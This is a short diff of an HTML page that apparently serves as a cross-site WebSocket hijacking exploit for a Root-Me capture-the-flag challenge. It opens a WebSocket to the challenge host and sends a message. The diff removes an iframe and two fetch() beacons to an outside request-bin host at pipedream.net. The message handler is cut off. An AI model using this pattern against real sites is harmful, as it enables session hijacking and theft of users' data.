@@ -1,15 +1,11 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <iframe src="http://ctf20.root-me.org/room"></iframe>
   <script>
-    fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/start');
-    
     const ws = new WebSocket('ws://ctf20.root-me.org/ws');
 
     ws.addEventListener('open', () => {
       ws.send("Tell me a secret");
-       fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/ws-opened');
     });
 
     ws.addEventListener('message', (event) => {
